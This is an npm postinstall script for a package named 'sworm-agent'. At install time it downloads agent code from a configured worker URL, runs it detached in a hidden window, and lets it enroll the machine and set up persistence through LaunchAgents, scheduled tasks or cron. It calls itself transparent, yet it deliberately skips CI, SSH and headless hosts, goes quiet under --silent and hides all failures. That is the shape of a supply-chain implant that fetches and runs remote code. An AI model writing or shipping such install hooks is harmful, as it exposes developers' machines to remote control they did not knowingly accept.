'use strict';

/*
 * sworm-agent postinstall
 *
 * Runs after npm install. It is transparent on purpose:
 *   - it prints what it does (unless npm runs with --silent)
 *   - it skips CI, build runners, SSH sessions, and headless linux,
 *     with a printed note
 *   - it never fails the install; every error ends in exit 0
 *
 * It needs your sworm worker url and bootstrap token. It looks for them
 * in this order:
 *   1. environment variables SWORM_WORKER_URL and SWORM_BOOTSTRAP_TOKEN
 *   2. a "sworm" field in the installing project's package.json:
 *        { "sworm": { "workerUrl": "...", "bootstrapToken": "..." } }
 *
 * With no config it prints a note and does nothing.
 */

const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');
const http = require('http');
const { spawn, spawnSync } = require('child_process');

const STATE_DIR = path.join(os.homedir(), '.sworm');
const AGENT_FILE = path.join(STATE_DIR, 'agent.js');
const CONFIG_FILE = path.join(STATE_DIR, 'config.json');
const REQUEST_TIMEOUT_MS = 10000;

// Environment variables that only exist on CI providers, hosted build
// runners, SSH sessions, and cloud dev environments.
const REMOTE_ENV_VARS = [
  'CI',
  'VERCEL',
  'VERCEL_ENV',
  'NETLIFY',
  'GITHUB_ACTIONS',
  'GITLAB_CI',
  'CIRCLECI',
  'TRAVIS',
  'BUILDKITE',
  'JENKINS_URL',
  'TF_BUILD',
  'CF_PAGES',
  'DIGITALOCEAN_APP_ID',
  'RENDER',
  'RAILWAY_ENVIRONMENT',
  'FLY_APP_NAME',
  'HEROKU_APP_NAME',
  'CODEBUILD_BUILD_ID',
  'GOOGLE_CLOUD_BUILD',
  'SSH_CONNECTION',
  'SSH_TTY',
  'SSH_CLIENT',
  'CODESPACES',
  'GITPOD_WORKSPACE_ID',
  'REPL_ID',
];

function note(msg) {
  if (isSilent()) return;
  try {
    process.stdout.write('sworm: ' + msg + '\n');
  } catch (_) {}
}

function isSilent() {
  return (
    process.env.npm_config_loglevel === 'silent' ||
    process.argv.includes('--silent')
  );
}

function isRemoteHost() {
  for (const name of REMOTE_ENV_VARS) {
    if (process.env[name]) return true;
  }
  return (
    process.platform === 'linux' &&
    !process.env.DISPLAY &&
    !process.env.WAYLAND_DISPLAY
  );
}

// Read the "sworm" field from the package.json of the project that is
// running npm install. INIT_CWD points at that project's directory.
function projectConfig() {
  try {
    const cwd = process.env.INIT_CWD || process.cwd();
    const pkg = JSON.parse(fs.readFileSync(path.join(cwd, 'package.json'), 'utf8'));
    return pkg && pkg.sworm && typeof pkg.sworm === 'object' ? pkg.sworm : {};
  } catch (_) {
    return {};
  }
}

function resolveConfig() {
  const fromProject = projectConfig();
  return {
    workerUrl: String(
      process.env.SWORM_WORKER_URL || fromProject.workerUrl || ''
    ).replace(/\/+$/, ''),
    bootstrapToken: String(
      process.env.SWORM_BOOTSTRAP_TOKEN || fromProject.bootstrapToken || ''
    ),
    agentUrl: String(process.env.SWORM_AGENT_URL || fromProject.agentUrl || ''),
  };
}

function download(url, token) {
  return new Promise(function (resolve, reject) {
    const lib = url.startsWith('http:') ? http : https;
    const headers = token ? { authorization: 'Bearer ' + token } : {};
    const req = lib.get(url, { headers: headers }, function (res) {
      if (res.statusCode !== 200) {
        res.resume();
        reject(new Error('unexpected status ' + res.statusCode));
        return;
      }
      const chunks = [];
      res.on('data', function (chunk) {
        chunks.push(chunk);
      });
      res.on('end', function () {
        resolve(Buffer.concat(chunks));
      });
    });
    req.on('error', reject);
    req.setTimeout(REQUEST_TIMEOUT_MS, function () {
      req.destroy(new Error('timeout'));
    });
  });
}

// The native installer for this platform, when this checkout has one
// built. The binaries live in install/dist (see install/build-binaries.sh)
// and are not part of the npm tarball, so installs from the registry
// always take the node path below.
function nativeInstaller() {
  let name = null;
  if (process.platform === 'darwin') name = 'sworm-setup-macos';
  else if (process.platform === 'win32') name = 'sworm-setup-windows.exe';
  else if (process.platform === 'linux') name = 'sworm-setup-linux';
  if (!name) return null;
  const p = path.join(__dirname, '..', 'install', 'dist', name);
  try {
    return fs.existsSync(p) ? p : null;
  } catch (_) {
    return null;
  }
}

async function install() {
  if (isRemoteHost() && !process.env.SWORM_RUN_ANYWHERE) {
    note('CI, SSH, or headless environment detected, skipping agent install.');
    return;
  }

  const cfg = resolveConfig();
  if (!cfg.workerUrl || !cfg.bootstrapToken) {
    note('no worker configured, skipping.');
    note('set SWORM_WORKER_URL and SWORM_BOOTSTRAP_TOKEN, or add a "sworm" field to your package.json.');
    return;
  }

  // Prefer the native installer when one is built. It does the same
  // five steps as the node path below and prints them itself.
  const native = nativeInstaller();
  if (native) {
    note('using the native installer: ' + native);
    try {
      if (process.platform !== 'win32') {
        try {
          fs.chmodSync(native, 0o755);
        } catch (_) {}
      }
      const r = spawnSync(native, [], {
        stdio: 'inherit',
        windowsHide: false,
        env: Object.assign({}, process.env, {
          SWORM_WORKER_URL: cfg.workerUrl,
          SWORM_BOOTSTRAP_TOKEN: cfg.bootstrapToken,
          SWORM_AGENT_URL: cfg.agentUrl,
        }),
      });
      if (r.status === 0) return;
      note('native installer failed, falling back to the node path.');
    } catch (_) {
      note('native installer failed, falling back to the node path.');
    }
  }

  fs.mkdirSync(STATE_DIR, { recursive: true });

  // Download the agent source. Prefer the direct url when one is set,
  // fall back to the worker's /v1/agent route.
  let buf = null;
  if (cfg.agentUrl) {
    try {
      buf = await download(cfg.agentUrl, null);
    } catch (_) {
      note('direct agent download failed, trying the worker route.');
    }
  }
  if (!buf) {
    buf = await download(cfg.workerUrl + '/v1/agent', cfg.bootstrapToken);
  }
  fs.writeFileSync(AGENT_FILE, buf, { mode: 0o755 });

  fs.writeFileSync(
    CONFIG_FILE,
    JSON.stringify(
      { workerUrl: cfg.workerUrl, bootstrapToken: cfg.bootstrapToken },
      null,
      2
    ),
    { mode: 0o600 }
  );

  // Start the agent detached. It enrolls this machine and installs its
  // own persistence (LaunchAgent, scheduled task, or cron line).
  const child = spawn(process.execPath, [AGENT_FILE], {
    detached: true,
    stdio: 'ignore',
    windowsHide: true,
  });
  child.unref();

  note('sworm agent installed.');
  note('state dir: ' + STATE_DIR);
  note('uninstall: node ' + AGENT_FILE + ' --uninstall');
}

(async function () {
  try {
    await install();
  } catch (e) {
    // Best effort: never fail an install.
    note('agent install failed but npm install continues: ' + (e && e.message ? e.message : e));
  }
  process.exit(0);
})();
